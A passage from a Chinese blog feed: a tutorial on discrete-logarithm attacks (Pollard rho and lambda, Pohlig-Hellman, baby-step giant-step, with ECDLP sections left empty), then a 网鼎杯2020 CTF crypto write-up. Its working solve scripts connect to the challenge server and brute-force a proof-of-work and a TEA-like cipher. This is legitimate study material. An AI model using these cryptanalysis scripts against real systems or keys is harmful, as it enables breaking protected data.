n上的随机序列$a,b$，有递推式如下：</p><p>$a_{i+1}=a_{i}+a[x_{i}\%psize],b_{i+1}=b_{i}+b[x_{i}\%psize]$</p><p>则令初始值$x_{0}$为$\alpha^{ax}$（ax随机），也可表示为$a_{0}=ax,b_{0}=0$，同时令$y_{0}=x_{0}$，按照上述进行递推，令$y_{i}=x_{2i}$，则发生碰撞时，我们有</p><script type="math/tex; mode=display">\alpha^{ax}\beta^{bx}=\alpha^{ay}\beta^{by}\\\alpha^{ay-ax}=(\alpha^{res})^{bx-by}</script><p>在$GCD(bx-by,n)=1$时，存在逆元，易求得$res=(bx-by)^{-1}(ay-ax)$.</p><p>ps: sage上的<code>discrete_log_rho</code>直接做了如下判断：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ord = base.multiplicative_order()</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ord.is_prime():</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"for Pollard rho algorithm the order of the group must be prime"</span>)</span><br></pre></td></tr></table></figure><p>啊这- -如果$G=F_{p}$，且阶恰好为$p-1$时，显然会直接抛出错误，因此我做了魔改，在最后求解res的时候再进行判断，代码如下：</p><h4 id="Code-1"><a href="#Code-1" class="headerlink" title="[Code]"></a>[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span><span class="params">(beta, alpha, N)</span>:</span></span><br><span class="line">    ord = Mod(alpha, N).multiplicative_order()</span><br><span class="line">    partition_size = <span class="number">10</span></span><br><span class="line">    upper_bound = <span class="number">8</span> * isqrt(ord)</span><br><span class="line">    I = IntegerModRing(ord)</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> tqdm(range(<span class="number">10</span>)):</span><br><span class="line">        a = [I.random_element() <span class="keyword">for</span> i <span class="keyword">in</span> range(partition_size)]</span><br><span class="line">        b = [I.random_element() <span class="keyword">for</span> i <span class="keyword">in</span> range(partition_size)]</span><br><span class="line">        c = [power(Mod(alpha, N), a[i]) * power(Mod(beta, N), b[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(partition_size)]</span><br><span class="line">        ax = I.random_element()</span><br><span class="line">        bx = I(<span class="number">0</span>)</span><br><span class="line">        x = power(Mod(alpha, N), ax) <span class="comment"># ini</span></span><br><span class="line">        ay, by, y = ax, bx, x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(upper_bound):</span><br><span class="line">            j = Integer(x) % partition_size</span><br><span class="line">            (x, ax, bx) = (x * c[j], ax + a[j], bx + b[j])</span><br><span class="line">            k = Integer(y) % partition_size</span><br><span class="line">            (y, ay, by) = (y * c[k], ay + a[k], by + b[k])</span><br><span class="line">            k = Integer(y) % partition_size</span><br><span class="line">            (y, ay, by) = (y * c[k], ay + a[k], by + b[k])</span><br><span class="line">            <span class="keyword">if</span> x == y:</span><br><span class="line">                <span class="keyword">if</span> ax == ay:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    res = Integer((ay - ax) / (bx - by))</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[-] Failed."</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="2-3-Pollard’s-λ-Method"><a href="#2-3-Pollard’s-λ-Method" class="headerlink" title="2.3    Pollard’s λ-Method"></a>2.3    Pollard’s λ-Method</h3><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="[Theorem]"></a>[Theorem]</h4><p>即Pollard’s Kangaroo Method，算法具体流程如下：</p><p>假设$G(=Z_{p})$是n阶循环群，$\alpha,\beta\in G$，满足$\alpha^{x}=\beta.$ 且我们知道$x\in [a,b]\subset [0,p-1]$.</p><ul><li><p>$l=b-a,J=\lfloor log_{2}(l)\rfloor$，令$S=\{randrange(1,p),…,randrange(1,p)\}=\{s(0),s(1),…,s(J-1)\}$.</p></li><li><p>Let’s begin with our tame kangaroo <em>T</em>. 令<em>T</em>从已知起始点开始跳跃，即令$t_{0}=\alpha^{b}(mod\ p)$, 跳跃路径如下：</p><script type="math/tex; mode=display">t(i+1)\equiv t(i)\alpha^{s(t(i)\ mod\ J)}</script><p>让<em>T</em>在跳跃n次后停止，且有n次后的跳跃距离(指数)如下：</p><script type="math/tex; mode=display">d(n)=\sum_{i=0}^{n-1}s(t(i)\ mod\ J)</script><p>因此$t(n)\equiv \alpha^{b+d(n)}\ mod\ p$.</p></li><li><p>Now we have to deal with the wild kangaroo <em>W</em>. <em>W</em>起始点$w_{0}=\alpha^{x}$，则类似<em>T</em>有：</p><script type="math/tex; mode=display">D(j)=\sum_{k=0}^{j-1}s(w(k)\ mod\ J),D(0)=0</script><p>$w(j)\equiv \alpha^{x+D(j)}\ mod\ p.$</p></li><li><p>当碰撞发生在$t(i)=w(j)$时，此点向后均$t(s)=w(r)\quad (s-i=r-j\geq 0)$. 即有</p><script type="math/tex; mode=display">\alpha^{x+D(m)}\equiv \alpha^{b+d(n)}\ mod\ p</script><p>即$x=b+d(n)-D(m)$.</p></li></ul><p>ps：将跳跃步数n取作$\lceil\sqrt{b-a}\rceil$将使n次后已碰撞的概率趋于1，求解失败则改变<em>S</em>重新求解.</p><h4 id="Code-2"><a href="#Code-2" class="headerlink" title="[Code]"></a>[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, log2, floor, ceil</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_lambda</span><span class="params">(beta, alpha, N)</span>:</span></span><br><span class="line">    a, b = <span class="number">0</span>, N - <span class="number">1</span></span><br><span class="line">    l = N - <span class="number">1</span></span><br><span class="line">    J = floor(log2(l))</span><br><span class="line">    n = ceil(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">10</span>)): <span class="comment">#求解次数上限</span></span><br><span class="line">        S = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(J):</span><br><span class="line">            r = getRandomRange(<span class="number">1</span>, l)</span><br><span class="line">            S.append((r, pow(alpha, r, N)))</span><br><span class="line">        <span class="comment"># tame kangaroo T</span></span><br><span class="line">        dt, t = b, pow(alpha, b, N)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            r, e = S[t % J]</span><br><span class="line">            dt += r</span><br><span class="line">            t = (t * e) % N</span><br><span class="line">        <span class="comment"># wild kangaroo W</span></span><br><span class="line">        dw, w = <span class="number">0</span>, beta</span><br><span class="line">        <span class="keyword">while</span> dt - dw &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> w == t:</span><br><span class="line">                <span class="keyword">return</span> dt - dw</span><br><span class="line">            r, e = S[w % J]</span><br><span class="line">            dw += r</span><br><span class="line">            w = (w * e) % N</span><br><span class="line">    print(<span class="string">"[-] Failed."</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="2-4-The-Pohlig-Hellman-Method"><a href="#2-4-The-Pohlig-Hellman-Method" class="headerlink" title="2.4    The Pohlig-Hellman Method"></a>2.4    The Pohlig-Hellman Method</h3><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="[Theorem]"></a>[Theorem]</h4><p>$G=Zmod(n)$，$\alpha,\beta\in G$，满足$\alpha^{x}=\beta.$ 则假设$\alpha$的阶为$ord$，且可表示为</p><script type="math/tex; mode=display">ord=\prod_{i=1}^{k}p_{i}^{r_{i}}</script><p>则对于$p^{r}$，有$x\equiv x_{0}+x_{1}p+x_{2}p^{2}+…+x_{r-1}p^{r-1}\quad mod\ p^{r}$，$0\leq x_{i}\leq p-1.$</p><p>变换得$x(\frac{ord}{p})\equiv x_{0}(\frac{ord}{p})+ord\cdot m$，$m\in Z.$</p><p>即$\beta^{\frac{ord}{p}}\equiv \alpha^{x_{0}(\frac{ord}{p})+ord\cdot m}\equiv \alpha^{x_{0}(\frac{ord}{p})}\quad mod\ n.$</p><p>而这里的$x_{0}$则只要在$[0,p-1]$上枚举即可.</p><p>得到$x_{0}$以后，我们用类似的trick进行$x_{1}$的求解，有</p><p>$x(\frac{ord}{p^2})\equiv x_{0}(\frac{ord}{p^2})+x_{1}(\frac{ord}{p})+ord\cdot m’$.</p><p>令$\beta_1=\beta\alpha^{-x_{0}}$，则有$\beta_1^{\frac{ord}{p^{2}}}\equiv (\alpha^{x}\alpha^{-x_{0}})^{\frac{ord}{p^{2}}}\equiv \alpha^{x_{1}(\frac{ord}{p})+ord*m’}\equiv \alpha^{x_{1}(\frac{ord}{p})}\quad mod\ n$.</p><p>$\beta_2=\beta\alpha^{-x_0-x_1p}$，…，即升幂得到$x\ mod\ p^{r}$.</p><p>最后对所有结果CRT即可.（对于$p^{r}$上的求解可采用BSGS进一步减小时间复杂度）</p><h4 id="Code-3"><a href="#Code-3" class="headerlink" title="[Code]"></a>[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(alpha, beta, modulus, upper_bound=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> upper_bound:</span><br><span class="line">        upper_bound = Mod(alpha, modulus).multiplicative_order()</span><br><span class="line">    m = ceil(sqrt(upper_bound))</span><br><span class="line">    S = &#123;pow(alpha, j, modulus):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>)&#125;</span><br><span class="line">    gs = Mod(alpha, modulus)^(-m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> beta <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">return</span> (i * m + S[beta])</span><br><span class="line">        beta = (beta * gs) % modulus</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pohlig_hellman</span><span class="params">(beta, alpha, N)</span>:</span></span><br><span class="line">    beta, alpha = Mod(beta, N), Mod(alpha, N)</span><br><span class="line">    ord = alpha.multiplicative_order()</span><br><span class="line">    f = ord.factor()</span><br><span class="line">    prime_order_mod = [<span class="number">0</span>] * len(f)</span><br><span class="line">    <span class="keyword">for</span> i, (p, r) <span class="keyword">in</span> enumerate(f):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(r):</span><br><span class="line">            pmod = bsgs(alpha**(ord // p), (beta / alpha**prime_order_mod[i])**(ord // p**(j+<span class="number">1</span>)), N, p - <span class="number">1</span>)</span><br><span class="line">            prime_order_mod[i] += pmod * (p**j)</span><br><span class="line">    <span class="keyword">return</span> crt(prime_order_mod, [p**r <span class="keyword">for</span> (p, r) <span class="keyword">in</span> f])</span><br></pre></td></tr></table></figure><h2 id="Attacking-the-Elliptic-Curve-Discrete-Logarithm-Problem"><a href="#Attacking-the-Elliptic-Curve-Discrete-Logarithm-Problem" class="headerlink" title="Attacking the Elliptic Curve Discrete Logarithm Problem"></a>Attacking the Elliptic Curve Discrete Logarithm Problem</h2><blockquote><p>Attacks on the ECDLP can be split into two main categories:</p><ol><li>attacks that work in the general setting regardless of properties of a given elliptic curve.</li><li>attacks that use specific properties of the elliptic curve to develop a different approach.</li></ol></blockquote><h3 id="3-1-General-Attacks"><a href="#3-1-General-Attacks" class="headerlink" title="3.1    General Attacks"></a>3.1    General Attacks</h3><p>对于求解DLP/ECDLP的一般性方法，本文里的代码大多有对sage源码进行参考（且sage有轮子），但作为<strong>原理性文章</strong>，仍自己编写以加深理解or灵活修改（总不会特殊情况下有人莽到直接改sage源码吧不会吧不会吧</p><h4 id="3-1-1-Baby-Step-Giant-Step-Algorithm"><a href="#3-1-1-Baby-Step-Giant-Step-Algorithm" class="headerlink" title="3.1.1    Baby-Step, Giant-Step Algorithm"></a>3.1.1    Baby-Step, Giant-Step Algorithm</h4><h5 id="Theorem-4"><a href="#Theorem-4" class="headerlink" title="[Theorem]"></a>[Theorem]</h5><p>阶为n的基点P生成$E(F_{p})$，且$Q\in E(F_{p})$，Q=kP.</p><p>令$m=\lceil n\rceil$，即可将k表示为$im+j(0\leq i,j\leq m)$. 有</p><script type="math/tex; mode=display">Q=kP=(im+j)P=imP+jP\\Q-i(mP)=jP</script><p>与BSGS的DLP问题一样，建立$j\in [0,m]$的jP字典，再遍历i寻找碰撞即可.</p><h5 id="Code-4"><a href="#Code-4" class="headerlink" title="[Code]"></a>[Code]</h5><h4 id="3-1-2-Pollard’s-ρ-Method"><a href="#3-1-2-Pollard’s-ρ-Method" class="headerlink" title="3.1.2    Pollard’s ρ-Method"></a>3.1.2    Pollard’s ρ-Method</h4><h4 id="3-1-3-Pollard’s-λ-Method"><a href="#3-1-3-Pollard’s-λ-Method" class="headerlink" title="3.1.3    Pollard’s λ-Method"></a>3.1.3    Pollard’s λ-Method</h4><h4 id="3-1-4-The-Pohlig-Hellman-Method"><a href="#3-1-4-The-Pohlig-Hellman-Method" class="headerlink" title="3.1.4    The Pohlig-Hellman Method"></a>3.1.4    The Pohlig-Hellman Method</h4><h5 id="Theorem-5"><a href="#Theorem-5" class="headerlink" title="[Theorem]"></a>[Theorem]</h5><p>$Q,P\in E(F_{p}),Q=kP$. 令n为P生成子群的阶，$n=\prod_{i=1}^{k}p_{i}^{r_{i}}$.</p><p>类比DLP上的Pohlig-Hellman，我们同样要去寻找$k_{i}\equiv k(mod\ p_{i}^{r_{i}})$.</p><p>$k\equiv x_{0}+x_{1}p+x_{2}p^{2}+…+x_{r-1}p^{r-1}\quad mod\ p^{r}$，$0\leq x_{i}\leq p-1.$</p><p>令集合$T_{i}=\{j\frac{n}{p_{i}}P:0\leq j\leq p_{i}-1\}.$，且有</p><p>$\frac{n}{p_{i}}Q=\frac{n}{p_{i}}([x_{0}+x_{1}p_{i}+x_{2}p_{i}^2+…+x_{r-1}p_{i}^{r-1}]P)=x_{0}\frac{n}{p_{i}}P+nmP=x_{0}\frac{n}{p_{i}}P.$</p><p>即可在$T_{i}$中寻找碰撞，从而得到$x_{0}$. </p><p>再令$Q_{1}=Q-x_{0}P$. 计算$\frac{n}{p_{i}^2}Q_{1}$与$T_{i}$的碰撞，得到$x_{1}$，继续升幂即可. 最后CRT.</p><h5 id="Code-5"><a href="#Code-5" class="headerlink" title="[Code]"></a>[Code]</h5><h3 id="3-2-Specialized-Attacks"><a href="#3-2-Specialized-Attacks" class="headerlink" title="3.2    Specialized Attacks"></a>3.2    Specialized Attacks</h3><h4 id="3-2-1-Anomalous-Curves"><a href="#3-2-1-Anomalous-Curves" class="headerlink" title="3.2.1    Anomalous Curves"></a>3.2.1    Anomalous Curves</h4><h4 id="3-2-2-The-MOV-Attack"><a href="#3-2-2-The-MOV-Attack" class="headerlink" title="3.2.2    The MOV Attack"></a>3.2.2    The MOV Attack</h4><h4 id="3-2-3-Weil-Descent-and-the-GHS-Attack"><a href="#3-2-3-Weil-Descent-and-the-GHS-Attack" class="headerlink" title="3.2.3    Weil Descent and the GHS Attack"></a>3.2.3    Weil Descent and the GHS Attack</h4>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elliptic Curve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(网鼎杯2020青龙组) - Crypto</title>
      <link href="/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/"/>
      <url>/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p>Crypto出题质量挺差的…其他方向全程看队友输出（8说了线下撤硕见</p><p><img src= "/img/loading.gif" data-src="/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/Rank.png" alt></p><h3 id="you-raise-me-up"><a href="#you-raise-me-up" class="headerlink" title="you raise me up"></a>you raise me up</h3><p>$mod\ 2^{512}$的DLP，按位恢复即可（赛后看其他师傅基本都是用的sage的<code>discrete_log</code>，扒了下源码发现这个内置函数用的PH算法，而这题的阶又足够光滑，所以也能秒出）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">2</span></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line">flag = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">513</span>):</span><br><span class="line">    n *= <span class="number">2</span></span><br><span class="line">    phi *= <span class="number">2</span></span><br><span class="line">    candidate = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">if</span> pow(m, i, n) == c % n:</span><br><span class="line">            candidate.append(i)</span><br><span class="line">    flag = [x + phi <span class="keyword">for</span> x <span class="keyword">in</span> candidate] + candidate</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(long_to_bytes(i))</span><br></pre></td></tr></table></figure><h3 id="easy-ya"><a href="#easy-ya" class="headerlink" title="easy_ya"></a>easy_ya</h3><p>先靶机交互proof_of_work拿数据（没提示明文串长度，但是一猜4就中了- -</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"39.96.90.217"</span>, <span class="string">"17497"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"= "</span>)</span><br><span class="line">suffix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">print(suffix)</span><br><span class="line">io.recvuntil(<span class="string">"openssl_"</span>)</span><br><span class="line">mode = io.recvuntil(<span class="string">"&gt;"</span>)[:<span class="number">-1</span>].decode(<span class="string">"utf-8"</span>)</span><br><span class="line">print(mode)</span><br><span class="line">pts = itertools.product(string.printable, repeat=<span class="number">4</span>)</span><br><span class="line">len = <span class="number">100</span>**<span class="number">4</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> pts:</span><br><span class="line">    <span class="keyword">if</span> cnt % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"&#123;&#125;%"</span>.format(<span class="number">100</span>*cnt/len))</span><br><span class="line">    p = <span class="string">""</span>.join(list(pt))</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">"sha1"</span>:</span><br><span class="line">        ct = sha1(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha224"</span>:</span><br><span class="line">        ct = sha224(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha256"</span>:</span><br><span class="line">        ct = sha256(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha384"</span>:</span><br><span class="line">        ct = sha384(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha512"</span>:</span><br><span class="line">        ct = sha512(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"md5"</span>:</span><br><span class="line">        ct = md5(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> ct[:<span class="number">20</span>] == suffix:</span><br><span class="line">        print(p)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>然后GCD分解RSA模数，进而拿到Key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">136</span>, <span class="number">145</span>, <span class="number">137</span>, <span class="number">128</span>, <span class="number">136</span>, <span class="number">177</span>, <span class="number">151</span>, <span class="number">160</span>, <span class="number">191</span>, <span class="number">167</span>, <span class="number">129</span>, <span class="number">153</span>, <span class="number">178</span>, <span class="number">129</span>, <span class="number">149</span>, <span class="number">191</span>, <span class="number">174</span>, <span class="number">137</span>]</span><br></pre></td></tr></table></figure><p>拿到Key以后，又知每个分组加密后的密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint = nhex((y &lt;&lt; <span class="number">52</span>) ^ (pads &lt;&lt; <span class="number">20</span>) ^ z)</span><br></pre></td></tr></table></figure><p>则有 <code>y = hint &gt;&gt; 52</code></p><p><code>high_pads = (cipher % (2**52)) &gt;&gt; 32 &lt;&lt; 12</code></p><p><code>low_z = cipher % (2**20)</code></p><p>中间未知的12比特直接爆破即可，又有 <code>(32 * pad) % 0x100000000 == pads</code></p><p>即pad高5位未知，同样爆破即可，编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">limit = <span class="keyword">lambda</span> n: n &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    flags = []</span><br><span class="line">    a = <span class="number">2291239296</span></span><br><span class="line">    b = <span class="number">2293340064</span></span><br><span class="line">    c = <span class="number">3215425945</span></span><br><span class="line">    d = <span class="number">2994836927</span></span><br><span class="line">    high_pads = (cipher % (<span class="number">2</span>**<span class="number">52</span>)) &gt;&gt; <span class="number">32</span> &lt;&lt; <span class="number">12</span></span><br><span class="line">    mid = (cipher % (<span class="number">2</span>**<span class="number">32</span>)) &gt;&gt; <span class="number">20</span></span><br><span class="line">    low_z = cipher % (<span class="number">2</span>**<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">2</span>**<span class="number">12</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">5</span>):</span><br><span class="line">            pads = high_pads + i</span><br><span class="line">            <span class="comment"># (32 * pad) % 0x100000000 == pads</span></span><br><span class="line">            low_pad = pads &gt;&gt; <span class="number">5</span></span><br><span class="line">            y = cipher &gt;&gt; <span class="number">52</span></span><br><span class="line">            z = ((i ^ mid) &lt;&lt; <span class="number">20</span>) + low_z</span><br><span class="line">            pad = (j &lt;&lt; <span class="number">27</span>) + low_pad</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                z = limit(z - ((y*<span class="number">16</span> + c) ^ (y + pads) ^ ((y&gt;&gt;<span class="number">5</span>) + d)))</span><br><span class="line">                y = limit(y - ((z*<span class="number">16</span> + a) ^ (z + pads) ^ ((z&gt;&gt;<span class="number">5</span>) + b)))</span><br><span class="line">                pads = limit(pads - pad)</span><br><span class="line">            <span class="keyword">if</span> pads != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            flag = long_to_bytes(y) + long_to_bytes(z)</span><br><span class="line">            mark = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0</span> &lt; _ &lt; <span class="number">32</span> <span class="keyword">or</span> _ &gt;= <span class="number">128</span>:</span><br><span class="line">                    mark = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> mark == <span class="literal">True</span>:</span><br><span class="line">                flags.append(flag)</span><br><span class="line">    <span class="keyword">return</span> flags</span><br><span class="line"></span><br><span class="line">flag1 = decode(<span class="number">0xa5c5825052a4f2f97d50d</span>)</span><br><span class="line">flag2 = decode(<span class="number">0x916584dbfa561434b59a9</span>)</span><br><span class="line">flag3 = decode(<span class="number">0xd4148395b3a564bc85ef5</span>)</span><br><span class="line">flag4 = decode(<span class="number">0xb165eb6c68948a4860b12</span>)</span><br><span class="line">flag5 = decode(<span class="number">0xe698497f90f8b6fa51e0a</span>)</span><br></pre></td></tr></table></figure><p>半分钟出结果</p><p><img 